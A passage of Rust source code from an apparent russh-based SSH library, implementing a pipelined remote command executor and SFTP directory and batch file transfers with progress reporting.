  /// Queue of pending commands to execute\n    pending: Vec\u003cPendingCommand\u003e,\n    /// Default timeout for all commands (in seconds)\n    default_timeout: Option\u003cu64\u003e,\n}\n\nimpl\u003c'a\u003e PipelinedExecutor\u003c'a\u003e {\n    /// Create a new pipelined executor for the given connection\n    pub fn new(connection: \u0026'a RusshConnection) -\u003e Self {\n        Self {\n            connection,\n            pending: Vec::new(),\n            default_timeout: None,\n        }\n    }\n\n    /// Create a new pipelined executor with a default timeout\n    pub fn with_timeout(connection: \u0026'a RusshConnection, timeout_secs: u64) -\u003e Self {\n        Self {\n            connection,\n            pending: Vec::new(),\n            default_timeout: Some(timeout_secs),\n        }\n    }\n\n    /// Create a new pipelined executor with pre-allocated capacity\n    pub fn with_capacity(connection: \u0026'a RusshConnection, capacity: usize) -\u003e Self {\n        Self {\n            connection,\n            pending: Vec::with_capacity(capacity),\n            default_timeout: None,\n        }\n    }\n\n    /// Queue a command for execution without blocking\n    ///\n    /// This method adds a command to the internal queue. The command\n    /// will not be executed until `flush()` is called.\n    ///\n    /// # Arguments\n    ///\n    /// * `command` - The shell command to execute\n    /// * `options` - Optional execution options (cwd, env, timeout, etc.)\n    pub fn queue(\u0026mut self, command: impl Into\u003cString\u003e, options: Option\u003cExecuteOptions\u003e) {\n        self.pending.push(PendingCommand::new(command, options));\n    }\n\n    /// Queue multiple commands at once\n    ///\n    /// All commands will use default execution options.\n    pub fn queue_all\u003cI, S\u003e(\u0026mut self, commands: I)\n    where\n        I: IntoIterator\u003cItem = S\u003e,\n        S: Into\u003cString\u003e,\n    {\n        for cmd in commands {\n            self.queue(cmd, None);\n        }\n    }\n\n    /// Queue a command with specific options\n    pub fn queue_with_options(\u0026mut self, command: impl Into\u003cString\u003e, options: ExecuteOptions) {\n        self.pending\n            .push(PendingCommand::new(command, Some(options)));\n    }\n\n    /// Get the number of pending commands\n    pub fn pending_count(\u0026self) -\u003e usize {\n        self.pending.len()\n    }\n\n    /// Check if there are any pending commands\n    pub fn is_empty(\u0026self) -\u003e bool {\n        self.pending.is_empty()\n    }\n\n    /// Clear all pending commands without executing them\n    pub fn clear(\u0026mut self) {\n        self.pending.clear();\n    }\n\n    /// Get a reference to pending commands\n    pub fn pending(\u0026self) -\u003e \u0026[PendingCommand] {\n        \u0026self.pending\n    }\n\n    /// Set the default timeout for all commands\n    pub fn set_default_timeout(\u0026mut self, timeout_secs: Option\u003cu64\u003e) {\n        self.default_timeout = timeout_secs;\n    }\n\n    /// Flush the pipeline: send all commands and collect all responses\n    ///\n    /// This is the core pipelining method. It works by:\n    /// 1. Opening all SSH channels in parallel (without waiting for previous ones)\n    /// 2. Executing all commands on their respective channels\n    /// 3. Collecting all outputs concurrently\n    ///\n    /// Returns a vector of results in the same order as commands were queued.\n    ///\n    /// # Errors\n    ///\n    /// Individual command failures are returned in the result vector.\n    /// If the connection is closed, all commands will return `ConnectionClosed` errors.\n    pub async fn flush(mut self) -\u003e Vec\u003cConnectionResult\u003cCommandResult\u003e\u003e {\n        if self.pending.is_empty() {\n            return Vec::new();\n        }\n\n        // Take ownership of pending commands (leaves empty vec to satisfy Drop)\n        let commands = std::mem::take(\u0026mut self.pending);\n        let num_commands = commands.len();\n        let default_timeout = self.default_timeout;\n\n        debug!(\n            num_commands = %num_commands,\n            \"Flushing pipelined commands\"\n        );\n\n        // Get the SSH handle - use read() since we only need to open channels\n        let handle_guard = self.connection.handle.read().await;\n        let handle = match handle_guard.as_ref() {\n            Some(h) =\u003e h,\n            None =\u003e {\n                // Connection is closed, return errors for all commands\n                return (0..num_commands)\n                    .map(|_| Err(ConnectionError::ConnectionClosed))\n                    .collect();\n            }\n        };\n\n        // Phase 1: Open all channels in parallel\n        // This is the key insight for pipelining - we can open channels\n        // before the previous ones complete their command execution\n        trace!(\"Phase 1: Opening {} channels in parallel\", num_commands);\n\n        let channel_futures: Vec\u003c_\u003e = (0..num_commands)\n            .map(|_| handle.channel_open_session())\n            .collect();\n\n        let channel_results = futures::future::join_all(channel_futures).await;\n\n        // Drop the handle guard early to allow other operations\n        drop(handle_guard);\n\n        // Collect opened channels, tracking which ones failed\n        let mut channels: Vec\u003cOption\u003crussh::Channel\u003crussh::client::Msg\u003e\u003e\u003e =\n            Vec::with_capacity(num_commands);\n        let mut channel_errors: Vec\u003cOption\u003cConnectionError\u003e\u003e =\n            (0..num_commands).map(|_| None).collect();\n\n        for (idx, result) in channel_results.into_iter().enumerate() {\n            match result {\n                Ok(channel) =\u003e {\n                    channels.push(Some(channel));\n                }\n                Err(e) =\u003e {\n                    channels.push(None);\n                    channel_errors[idx] = Some(ConnectionError::ExecutionFailed(format!(\n                        \"Failed to open channel: {}\",\n                        e\n                    )));\n                }\n            }\n        }\n\n        // Phase 2: Execute commands on all channels\n        // Build the full command strings and execute them\n        trace!(\"Phase 2: Executing {} commands\", num_commands);\n\n        for (idx, cmd) in commands.iter().enumerate() {\n            if channel_errors[idx].is_some() {\n                continue; // Skip if channel open failed\n            }\n\n            if let Some(Some(channel)) = channels.get_mut(idx) {\n                let full_command =\n                    RusshConnection::build_command_with_env(\u0026cmd.command, \u0026cmd.options);\n\n                if let Err(e) = channel.exec(true, full_command).await {\n                    // Mark this channel as failed\n                    channels[idx] = None;\n                    channel_errors[idx] = Some(ConnectionError::ExecutionFailed(format!(\n                        \"Failed to execute command: {}\",\n                        e\n                    )));\n                }\n            }\n        }\n\n        // Handle escalation passwords if needed (for commands that require it)\n        for (idx, cmd) in commands.iter().enumerate() {\n            if channel_errors[idx].is_some() {\n                continue;\n            }\n\n            if cmd.options.escalate \u0026\u0026 cmd.options.escalate_password.is_some() {\n                if let Some(Some(channel)) = channels.get_mut(idx) {\n                    let password = cmd.options.escalate_password.as_ref().unwrap();\n                    let password_data = format!(\"{}\\n\", password);\n                    let mut cursor = tokio::io::BufReader::new(password_data.as_bytes());\n\n                    if let Err(e) = channel.data(\u0026mut cursor).await {\n                        channels[idx] = None;\n                        channel_errors[idx] = Some(ConnectionError::ExecutionFailed(format!(\n                            \"Failed to write password: {}\",\n                            e\n                        )));\n                    }\n                }\n            }\n        }\n\n        // Phase 3: Collect outputs from all channels concurrently\n        trace!(\"Phase 3: Collecting outputs from {} channels\", num_commands);\n\n        let collect_futures: Vec\u003c_\u003e = channels\n            .into_iter()\n            .zip(channel_errors.into_iter())\n            .zip(commands.iter())\n            .map(|((channel_opt, error_opt), cmd)| {\n                let timeout = cmd.options.timeout.or(default_timeout);\n\n                async move {\n                    // If we already have an error, return it\n                    if let Some(e) = error_opt {\n                        return Err(e);\n                    }\n\n                    // If channel is None, something went wrong\n                    let Some(mut channel) = channel_opt else {\n                        return Err(ConnectionError::ExecutionFailed(\n                            \"Channel not available\".to_string(),\n                        ));\n                    };\n\n                    // Collect output with optional timeout\n                    let collect_output = async {\n                        let mut stdout = Vec::new();\n                        let mut stderr = Vec::new();\n                        let mut exit_code = None;\n\n                        while let Some(msg) = channel.wait().await {\n                            match msg {\n                                ChannelMsg::Data { ref data } =\u003e {\n                                    stdout.extend_from_slice(data);\n                                }\n                                ChannelMsg::ExtendedData { ref data, ext } =\u003e {\n                                    if ext == 1 {\n                                        stderr.extend_from_slice(data);\n                                    }\n                                }\n                                ChannelMsg::ExitStatus { exit_status } =\u003e {\n                                    exit_code = Some(exit_status);\n                                }\n                                ChannelMsg::Eof | ChannelMsg::Close =\u003e {\n                                    if matches!(msg, ChannelMsg::Close) {\n                                        break;\n                                    }\n                                }\n                                _ =\u003e {}\n                            }\n                        }\n\n                        // Send EOF to properly close the channel\n                        let _ = channel.eof().await;\n\n                        let exit_code = exit_code.map(|e| e as i32).unwrap_or(i32::MAX);\n                        let stdout_str = String::from_utf8_lossy(\u0026stdout).to_string();\n                        let stderr_str = String::from_utf8_lossy(\u0026stderr).to_string();\n\n                        if exit_code == 0 {\n                            Ok(CommandResult::success(stdout_str, stderr_str))\n                        } else {\n                            Ok(CommandResult::failure(exit_code, stdout_str, stderr_str))\n                        }\n                    };\n\n                    if let Some(timeout_secs) = timeout {\n                        match tokio::time::timeout(\n                            Duration::from_secs(timeout_secs),\n                            collect_output,\n                        )\n                        .await\n                        {\n                            Ok(result) =\u003e result,\n                            Err(_) =\u003e Err(ConnectionError::Timeout(timeout_secs)),\n                        }\n                    } else {\n                        collect_output.await\n                    }\n                }\n            })\n            .collect();\n\n        let results = futures::future::join_all(collect_futures).await;\n\n        debug!(\n            num_commands = %num_commands,\n            successful = %results.iter().filter(|r| r.is_ok()).count(),\n            \"Pipeline flush completed\"\n        );\n\n        results\n    }\n\n    /// Flush the pipeline and return results only for successful commands\n    ///\n    /// This is a convenience method that filters out failed commands\n    /// and returns only successful results.\n    pub async fn flush_ok(self) -\u003e Vec\u003cCommandResult\u003e {\n        self.flush()\n            .await\n            .into_iter()\n            .filter_map(|r| r.ok())\n            .collect()\n    }\n\n    /// Flush the pipeline and return the first error if any command fails\n    ///\n    /// Returns Ok with all results if all commands succeed, or the first\n    /// error encountered.\n    pub async fn flush_all_ok(self) -\u003e ConnectionResult\u003cVec\u003cCommandResult\u003e\u003e {\n        let results = self.flush().await;\n        let mut ok_results = Vec::with_capacity(results.len());\n\n        for result in results {\n            match result {\n                Ok(r) =\u003e ok_results.push(r),\n                Err(e) =\u003e return Err(e),\n            }\n        }\n\n        Ok(ok_results)\n    }\n\n    /// Flush and collect results with their original commands\n    ///\n    /// Returns tuples of (command, result) for easy correlation.\n    pub async fn flush_with_commands(self) -\u003e Vec\u003c(String, ConnectionResult\u003cCommandResult\u003e)\u003e {\n        let commands: Vec\u003cString\u003e = self.pending.iter().map(|c| c.command.clone()).collect();\n        let results = self.flush().await;\n\n        commands.into_iter().zip(results).collect()\n    }\n}\n\nimpl RusshConnection {\n    /// Create a new pipelined executor for this connection\n    ///\n    /// This allows executing multiple commands with minimal latency\n    /// by leveraging SSH channel pipelining.\n    ///\n    /// # Example\n    ///\n    /// ```ignore\n    /// let mut pipeline = connection.pipeline();\n    /// pipeline.queue(\"ls -la\", None);\n    /// pipeline.queue(\"df -h\", None);\n    /// pipeline.queue(\"free -m\", None);\n    /// let results = pipeline.flush().await;\n    /// ```\n    pub fn pipeline(\u0026self) -\u003e PipelinedExecutor\u003c'_\u003e {\n        PipelinedExecutor::new(self)\n    }\n\n    /// Create a new pipelined executor with a default timeout\n    ///\n    /// All commands will use this timeout unless overridden in their options.\n    pub fn pipeline_with_timeout(\u0026self, timeout_secs: u64) -\u003e PipelinedExecutor\u003c'_\u003e {\n        PipelinedExecutor::with_timeout(self, timeout_secs)\n    }\n\n    /// Create a new pipelined executor with pre-allocated capacity\n    ///\n    /// Use this when you know approximately how many commands you'll execute.\n    pub fn pipeline_with_capacity(\u0026self, capacity: usize) -\u003e PipelinedExecutor\u003c'_\u003e {\n        PipelinedExecutor::with_capacity(self, capacity)\n    }\n\n    /// Execute multiple commands with pipelining (convenience method)\n    ///\n    /// This is a convenience method that creates a pipeline, queues all commands,\n    /// and flushes in one call.\n    ///\n    /// # Example\n    ///\n    /// ```ignore\n    /// let results = connection.execute_pipelined(\u0026[\n    ///     \"echo hello\",\n    ///     \"echo world\",\n    ///     \"date\",\n    /// ]).await;\n    /// ```\n    pub async fn execute_pipelined\u003cI, S\u003e(\u0026self, commands: I) -\u003e Vec\u003cConnectionResult\u003cCommandResult\u003e\u003e\n    where\n        I: IntoIterator\u003cItem = S\u003e,\n        S: Into\u003cString\u003e,\n    {\n        let mut pipeline = self.pipeline();\n        pipeline.queue_all(commands);\n        pipeline.flush().await\n    }\n}\n\n/// Drop implementation ensures pending commands are logged if not flushed\nimpl\u003c'a\u003e Drop for PipelinedExecutor\u003c'a\u003e {\n    fn drop(\u0026mut self) {\n        if !self.pending.is_empty() {\n            warn!(\n                pending_count = %self.pending.len(),\n                \"PipelinedExecutor dropped with pending commands that were not flushed\"\n            );\n        }\n    }\n}\n\n// ============================================================================\n// Directory Transfer and Progress Operations\n// ============================================================================\n\nimpl RusshConnection {\n    /// Upload a directory recursively with parallel transfers\n    pub async fn upload_directory(\n        \u0026self,\n        local_dir: \u0026Path,\n        remote_dir: \u0026Path,\n        options: Option\u003cDirectoryTransferOptions\u003e,\n        progress: Option\u003cBatchProgressCallback\u003e,\n    ) -\u003e ConnectionResult\u003cBatchTransferResult\u003e {\n        let options = options.unwrap_or_default();\n        if !local_dir.is_dir() {\n            return Err(ConnectionError::TransferFailed(format!(\n                \"Not a directory: {}\",\n                local_dir.display()\n            )));\n        }\n        debug!(local = %local_dir.display(), remote = %remote_dir.display(), \"Starting directory upload\");\n        let files = self\n            .collect_local_files(local_dir, remote_dir, \u0026options, 0)\n            .await?;\n        if files.is_empty() {\n            return Ok(BatchTransferResult {\n                successful: 0,\n                failed: 0,\n                results: Vec::new(),\n            });\n        }\n        let handle_guard = self.handle.read().await;\n        let h = handle_guard\n            .as_ref()\n            .ok_or_else(|| ConnectionError::ConnectionClosed)?;\n        let sftp = Self::open_sftp(h).await?;\n        Self::create_remote_dirs_sftp(\u0026sftp, remote_dir).await?;\n        drop(handle_guard);\n        self.upload_batch_with_progress(\u0026files, Some(options.transfer_options), progress)\n            .await\n    }\n\n    async fn collect_local_files(\n        \u0026self,\n        local_dir: \u0026Path,\n        remote_dir: \u0026Path,\n        options: \u0026DirectoryTransferOptions,\n        depth: usize,\n    ) -\u003e ConnectionResult\u003cVec\u003c(PathBuf, PathBuf)\u003e\u003e {\n        if options.max_depth.map_or(false, |max| depth \u003e max) {\n            return Ok(Vec::new());\n        }\n        let mut files = Vec::new();\n        let mut entries = tokio::fs::read_dir(local_dir).await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\n                \"Failed to read directory {}: {}\",\n                local_dir.display(),\n                e\n            ))\n        })?;\n        while let Some(entry) = entries\n            .next_entry()\n            .await\n            .map_err(|e| ConnectionError::TransferFailed(format!(\"Failed to read entry: {}\", e)))?\n        {\n            let path = entry.path();\n            let name = path\n                .file_name()\n                .map(|n| n.to_string_lossy().to_string())\n                .unwrap_or_default();\n            if options\n                .exclude_patterns\n                .iter()\n                .any(|p| glob::Pattern::new(p).map_or(false, |pat| pat.matches(\u0026name)))\n            {\n                continue;\n            }\n            if !options.include_patterns.is_empty()\n                \u0026\u0026 !options\n                    .include_patterns\n                    .iter()\n                    .any(|p| glob::Pattern::new(p).map_or(false, |pat| pat.matches(\u0026name)))\n            {\n                continue;\n            }\n            let remote_path = remote_dir.join(\u0026name);\n            let meta = entry.metadata().await.map_err(|e| {\n                ConnectionError::TransferFailed(format!(\"Failed to get metadata: {}\", e))\n            })?;\n            if meta.is_dir() {\n                files.extend(\n                    Box::pin(self.collect_local_files(\u0026path, \u0026remote_path, options, depth + 1))\n                        .await?,\n                );\n            } else if meta.is_file() \u0026\u0026 (options.follow_symlinks || !meta.file_type().is_symlink())\n            {\n                files.push((path, remote_path));\n            }\n        }\n        Ok(files)\n    }\n\n    /// Download a directory recursively with parallel transfers\n    pub async fn download_directory(\n        \u0026self,\n        remote_dir: \u0026Path,\n        local_dir: \u0026Path,\n        options: Option\u003cDirectoryTransferOptions\u003e,\n        progress: Option\u003cBatchProgressCallback\u003e,\n    ) -\u003e ConnectionResult\u003cBatchTransferResult\u003e {\n        let options = options.unwrap_or_default();\n        debug!(remote = %remote_dir.display(), local = %local_dir.display(), \"Starting directory download\");\n        let files = self\n            .collect_remote_files(remote_dir, local_dir, \u0026options, 0)\n            .await?;\n        if files.is_empty() {\n            return Ok(BatchTransferResult {\n                successful: 0,\n                failed: 0,\n                results: Vec::new(),\n            });\n        }\n        tokio::fs::create_dir_all(local_dir).await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\"Failed to create directory: {}\", e))\n        })?;\n        self.download_batch_with_progress(\u0026files, progress).await\n    }\n\n    async fn collect_remote_files(\n        \u0026self,\n        remote_dir: \u0026Path,\n        local_dir: \u0026Path,\n        options: \u0026DirectoryTransferOptions,\n        depth: usize,\n    ) -\u003e ConnectionResult\u003cVec\u003c(PathBuf, PathBuf)\u003e\u003e {\n        if options.max_depth.map_or(false, |max| depth \u003e max) {\n            return Ok(Vec::new());\n        }\n        let handle_guard = self.handle.read().await;\n        let h = handle_guard\n            .as_ref()\n            .ok_or_else(|| ConnectionError::ConnectionClosed)?;\n        let sftp = Self::open_sftp(h).await?;\n        drop(handle_guard);\n        let read_dir = sftp\n            .read_dir(remote_dir.to_string_lossy().to_string())\n            .await\n            .map_err(|e| {\n                ConnectionError::TransferFailed(format!(\"Failed to read remote directory: {}\", e))\n            })?;\n        let mut files = Vec::new();\n        for entry in read_dir {\n            let name = entry.file_name();\n            if name == \".\" || name == \"..\" {\n                continue;\n            }\n            if options\n                .exclude_patterns\n                .iter()\n                .any(|p| glob::Pattern::new(p).map_or(false, |pat| pat.matches(\u0026name)))\n            {\n                continue;\n            }\n            if !options.include_patterns.is_empty()\n                \u0026\u0026 !options\n                    .include_patterns\n                    .iter()\n                    .any(|p| glob::Pattern::new(p).map_or(false, |pat| pat.matches(\u0026name)))\n            {\n                continue;\n            }\n            let remote_path = remote_dir.join(\u0026name);\n            let local_path = local_dir.join(\u0026name);\n            let meta = entry.metadata();\n            if meta.is_dir() {\n                files.extend(\n                    Box::pin(self.collect_remote_files(\n                        \u0026remote_path,\n                        \u0026local_path,\n                        options,\n                        depth + 1,\n                    ))\n                    .await?,\n                );\n            } else if !meta.is_symlink() || options.follow_symlinks {\n                files.push((remote_path, local_path));\n            }\n        }\n        Ok(files)\n    }\n\n    /// Upload multiple files with batch progress reporting\n    pub async fn upload_batch_with_progress(\n        \u0026self,\n        files: \u0026[(PathBuf, PathBuf)],\n        options: Option\u003cTransferOptions\u003e,\n        progress: Option\u003cBatchProgressCallback\u003e,\n    ) -\u003e ConnectionResult\u003cBatchTransferResult\u003e {\n        if files.is_empty() {\n            return Ok(BatchTransferResult {\n                successful: 0,\n                failed: 0,\n                results: Vec::new(),\n            });\n        }\n        let options = Arc::new(options.unwrap_or_default());\n        let total_files = files.len();\n        let total_bytes: u64 = files\n            .iter()\n            .filter_map(|(local, _)| std::fs::metadata(local).ok())\n            .map(|m| m.len())\n            .sum();\n        let batch_progress = Arc::new(tokio::sync::Mutex::new(BatchTransferProgress::new(\n            total_files,\n            total_bytes,\n        )));\n        let semaphore = Arc::new(tokio::sync::Semaphore::new(MAX_CONCURRENT_TRANSFERS));\n        debug!(file_count = %total_files, total_bytes = %total_bytes, \"Starting batch upload with progress\");\n        let mut tasks: Vec\u003ctokio::task::JoinHandle\u003c(usize, SingleTransferResult)\u003e\u003e =\n            Vec::with_capacity(files.len());\n        for (idx, (local, remote)) in files.iter().enumerate() {\n            let (sem, local, remote, opts, bp, prog, handle, conn) = (\n                semaphore.clone(),\n                local.clone(),\n                remote.clone(),\n                options.clone(),\n                batch_progress.clone(),\n                progress.clone(),\n                self.handle.clone(),\n                self.connected.clone(),\n            );\n            tasks.push(tokio::spawn(async move {\n                let _permit = sem.acquire().await.ok();\n                if !conn.load(Ordering::SeqCst) {\n                    return (\n                        idx,\n                        SingleTransferResult {\n                            local_path: local,\n                            remote_path: remote,\n                            success: false,\n                            error: Some(ConnectionError::ConnectionClosed),\n                            bytes_transferred: 0,\n                        },\n                    );\n                }\n                let size = std::fs::metadata(\u0026local).map(|m| m.len()).unwrap_or(0);\n                {\n                    let mut b = bp.lock().await;\n                    b.current_file = Some(TransferProgress::upload(\u0026local, size));\n                    if let Some(ref c) = prog {\n                        c(\u0026b);\n                    }\n                }\n                let result = Self::upload_single_internal(\u0026handle, \u0026local, \u0026remote, \u0026opts).await;\n                let (success, error, bytes) = match result {\n                    Ok(b) =\u003e (true, None, b),\n                    Err(e) =\u003e (false, Some(e), 0),\n                };\n                {\n                    let mut b = bp.lock().await;\n                    b.completed_files += 1;\n                    if success {\n                        b.successful_files += 1;\n                        b.transferred_bytes += bytes;\n                    } else {\n                        b.failed_files += 1;\n                    }\n                    b.current_file = None;\n                    if let Some(ref c) = prog {\n                        c(\u0026b);\n                    }\n                }\n                (\n                    idx,\n                    SingleTransferResult {\n                        local_path: local,\n                        remote_path: remote,\n                        success,\n                        error,\n                        bytes_transferred: bytes,\n                    },\n                )\n            }));\n        }\n        let results_vec = futures::future::join_all(tasks).await;\n        let mut results: Vec\u003cSingleTransferResult\u003e = (0..files.len())\n            .map(|_| SingleTransferResult {\n                local_path: PathBuf::new(),\n                remote_path: PathBuf::new(),\n                success: false,\n                error: Some(ConnectionError::ExecutionFailed(\"Task error\".to_string())),\n                bytes_transferred: 0,\n            })\n            .collect();\n        let (mut successful, mut failed) = (0, 0);\n        for r in results_vec {\n            if let Ok((idx, res)) = r {\n                if res.success {\n                    successful += 1;\n                } else {\n                    failed += 1;\n                }\n                results[idx] = res;\n            } else {\n                failed += 1;\n            }\n        }\n        Ok(BatchTransferResult {\n            successful,\n            failed,\n            results,\n        })\n    }\n\n    async fn upload_single_internal(\n        handle: \u0026Arc\u003cRwLock\u003cOption\u003cHandle\u003cClientHandler\u003e\u003e\u003e\u003e,\n        local: \u0026Path,\n        remote: \u0026Path,\n        opts: \u0026TransferOptions,\n    ) -\u003e ConnectionResult\u003cu64\u003e {\n        let content = tokio::fs::read(local).await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\"Failed to read {}: {}\", local.display(), e))\n        })?;\n        let size = content.len() as u64;\n        let guard = handle.read().await;\n        let h = guard\n            .as_ref()\n            .ok_or_else(|| ConnectionError::ConnectionClosed)?;\n        let sftp = Self::open_sftp(h).await?;\n        drop(guard);\n        if opts.create_dirs {\n            if let Some(p) = remote.parent() {\n                Self::create_remote_dirs_sftp(\u0026sftp, p).await?;\n            }\n        }\n        let path_str = remote.to_string_lossy().to_string();\n        let mut file = sftp.create(\u0026path_str).await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\"Failed to create {}: {}\", remote.display(), e))\n        })?;\n        file.write_all(\u0026content)\n            .await\n            .map_err(|e| ConnectionError::TransferFailed(format!(\"Failed to write: {}\", e)))?;\n        if let Some(mode) = opts.mode {\n            let mut attrs = russh_sftp::protocol::FileAttributes::default();\n            attrs.permissions = Some(mode);\n            let _ = sftp.set_metadata(\u0026path_str, attrs).await;\n        }\n        Ok(size)\n    }\n\n    /// Download multiple files with batch progress reporting\n    pub async fn download_batch_with_progress(\n        \u0026self,\n        files: \u0026[(PathBuf, PathBuf)],\n        progress: Option\u003cBatchProgressCallback\u003e,\n    ) -\u003e ConnectionResult\u003cBatchTransferResult\u003e {\n        if files.is_empty() {\n            return Ok(BatchTransferResult {\n                successful: 0,\n                failed: 0,\n                results: Vec::new(),\n            });\n        }\n        let total_files = files.len();\n        let batch_progress = Arc::new(tokio::sync::Mutex::new(BatchTransferProgress::new(\n            total_files,\n            0,\n        )));\n        let semaphore = Arc::new(tokio::sync::Semaphore::new(MAX_CONCURRENT_TRANSFERS));\n        debug!(file_count = %total_files, \"Starting batch download with progress\");\n        let mut tasks: Vec\u003ctokio::task::JoinHandle\u003c(usize, SingleTransferResult)\u003e\u003e =\n            Vec::with_capacity(files.len());\n        for (idx, (remote, local)) in files.iter().enumerate() {\n            let (sem, remote, local, bp, prog, handle, conn) = (\n                semaphore.clone(),\n                remote.clone(),\n                local.clone(),\n                batch_progress.clone(),\n                progress.clone(),\n                self.handle.clone(),\n                self.connected.clone(),\n            );\n            tasks.push(tokio::spawn(async move {\n                let _permit = sem.acquire().await.ok();\n                if !conn.load(Ordering::SeqCst) {\n                    return (\n                        idx,\n                        SingleTransferResult {\n                            local_path: local,\n                            remote_path: remote,\n                            success: false,\n                            error: Some(ConnectionError::ConnectionClosed),\n                            bytes_transferred: 0,\n                        },\n                    );\n                }\n                {\n                    let mut b = bp.lock().await;\n                    b.current_file = Some(TransferProgress::download(\u0026remote, 0));\n                    if let Some(ref c) = prog {\n                        c(\u0026b);\n                    }\n                }\n                let result = Self::download_single_internal(\u0026handle, \u0026remote, \u0026local).await;\n                let (success, error, bytes) = match result {\n                    Ok(b) =\u003e (true, None, b),\n                    Err(e) =\u003e (false, Some(e), 0),\n                };\n                {\n                    let mut b = bp.lock().await;\n                    b.completed_files += 1;\n                    if success {\n                        b.successful_files += 1;\n                        b.transferred_bytes += bytes;\n                    } else {\n                        b.failed_files += 1;\n                    }\n                    b.current_file = None;\n                    if let Some(ref c) = prog {\n                        c(\u0026b);\n                    }\n                }\n                (\n                    idx,\n                    SingleTransferResult {\n                        local_path: local,\n                        remote_path: remote,\n                        success,\n                        error,\n                        bytes_transferred: bytes,\n                    },\n                )\n            }));\n        }\n        let results_vec = futures::future::join_all(tasks).await;\n        let mut results: Vec\u003cSingleTransferResult\u003e = (0..files.len())\n            .map(|_| SingleTransferResult {\n                local_path: PathBuf::new(),\n                remote_path: PathBuf::new(),\n                success: false,\n                error: Some(ConnectionError::ExecutionFailed(\"Task error\".to_string())),\n                bytes_transferred: 0,\n            })\n            .collect();\n        let (mut successful, mut failed) = (0, 0);\n        for r in results_vec {\n            if let Ok((idx, res)) = r {\n                if res.success {\n                    successful += 1;\n                } else {\n                    failed += 1;\n                }\n                results[idx] = res;\n            } else {\n                failed += 1;\n            }\n        }\n        Ok(BatchTransferResult {\n            successful,\n            failed,\n            results,\n        })\n    }\n\n    async fn download_single_internal(\n        handle: \u0026Arc\u003cRwLock\u003cOption\u003cHandle\u003cClientHandler\u003e\u003e\u003e\u003e,\n        remote: \u0026Path,\n        local: \u0026Path,\n    ) -\u003e ConnectionResult\u003cu64\u003e {\n        let guard = handle.read().await;\n        let h = guard\n            .as_ref()\n            .ok_or_else(|| ConnectionError::ConnectionClosed)?;\n        let sftp = Self::open_sftp(h).await?;\n        drop(guard);\n        let path_str = remote.to_string_lossy().to_string();\n        let mut file = sftp.open(\u0026path_str).await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\"Failed to open {}: {}\", remote.display(), e))\n        })?;\n        let mut content = Vec::new();\n        file.read_to_end(\u0026mut content)\n            .await\n            .map_err(|e| ConnectionError::TransferFailed(format!(\"Failed to read: {}\", e)))?;\n        let size = content.len() as u64;\n        if let Some(p) = local.parent() {\n            tokio::fs::create_dir_all(p).await.map_err(|e| {\n                ConnectionError::TransferFailed(format!(\"Failed to create dir: {}\", e))\n            })?;\n        }\n        tokio::fs::write(local, \u0026content).await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\"Failed to write {}: {}\", local.display(), e))\n        })?;\n        Ok(size)\n    }\n\n    /// Upload a file with progress callback\n    pub async fn upload_with_progress(\n        \u0026self,\n        local: \u0026Path,\n        remote: \u0026Path,\n        options: Option\u003cTransferOptions\u003e,\n        progress: ProgressCallback,\n    ) -\u003e ConnectionResult\u003c()\u003e {\n        let opts = options.unwrap_or_default();\n        let size = tokio::fs::metadata(local)\n            .await\n            .map_err(|e| ConnectionError::TransferFailed(format!(\"Failed to get metadata: {}\", e)))?\n            .len();\n        let mut prog = TransferProgress::upload(local, size);\n        progress(\u0026prog);\n        if size \u003c STREAM_THRESHOLD {\n            self.upload(local, remote, Some(opts)).await?;\n            prog.phase = TransferPhase::Completed;\n            prog.transferred_bytes = size;\n            progress(\u0026prog);\n            return Ok(());\n        }\n        let guard = self.handle.read().await;\n        let h = guard\n            .as_ref()\n            .ok_or_else(|| ConnectionError::ConnectionClosed)?;\n        let sftp = Self::open_sftp(h).await?;\n        drop(guard);\n        if opts.create_dirs {\n            if let Some(p) = remote.parent() {\n                Self::create_remote_dirs_sftp(\u0026sftp, p).await?;\n            }\n        }\n        let mut local_file = tokio::fs::File::open(local)\n            .await\n            .map_err(|e| ConnectionError::TransferFailed(format!(\"Failed to open: {}\", e)))?;\n        let path_str = remote.to_string_lossy().to_string();\n        let mut remote_file = sftp\n            .create(\u0026path_str)\n            .await\n            .map_err(|e| ConnectionError::TransferFailed(format!(\"Failed to create: {}\", e)))?;\n        prog.phase = TransferPhase::Transferring;\n        let mut buf = vec![0u8; CHUNK_SIZE];\n        let mut written = 0u64;\n        loop {\n            let n = local_file\n                .read(\u0026mut buf)\n                .await\n                .map_err(|e| ConnectionError::TransferFailed(format!(\"Read error: {}\", e)))?;\n            if n == 0 {\n                break;\n            }\n            remote_file\n                .write_all(\u0026buf[..n])\n                .await\n                .map_err(|e| ConnectionError::TransferFailed(format!(\"Write error: {}\", e)))?;\n            written += n as u64;\n            prog.update(written);\n            progress(\u0026prog);\n        }\n        drop(remote_file);\n        prog.phase = TransferPhase::Finalizing;\n        progress(\u0026prog);\n        if let Some(mode) = opts.mode {\n            let mut attrs = russh_sftp::protocol::FileAttributes::default();\n            attrs.permissions = Some(mode);\n            let _ = sftp.set_metadata(\u0026path_str, attrs).await;\n        }\n        if opts.owner.is_some() || opts.group.is_some() {\n            let og = match (\u0026opts.owner, \u0026opts.group) {\n                (Some(o), Some(g)) =\u003e format!(\"{}:{}\", o, g),\n                (Some(o), None) =\u003e o.clone(),\n                (None, Some(g)) =\u003e format!(\":{}\", g),\n                _ =\u003e String::new(),\n            };\n            if !og.is_empty() {\n                let _ = self\n                    .execute(\n                        \u0026format!(\n                            \"chown {} {}\",\n                            og,\n                            escape_shell_arg(\u0026remote.to_string_lossy())\n                        ),\n                        None,\n                    )\n                    .await;\n            }\n        }\n        prog.phase = TransferPhase::Completed;\n        progress(\u0026prog);\n        Ok(())\n    }\n\n    /// Download a file with progress callback\n    pub async fn download_with_progress(\n        \u0026self,\n        remote: \u0026Path,\n        local: \u0026Path,\n        progress: ProgressCallback,\n    ) -\u003e ConnectionResult\u003c()\u003e {\n        let guard = self.handle.read().await;\n        let h = guard\n            .as_ref()\n            .ok_or_else(|| ConnectionError::ConnectionClosed)?;\n        let sftp = Self::open_sftp(h).await?;\n        drop(guard);\n        let path_str = remote.to_string_lossy().to_string();\n        let attrs = 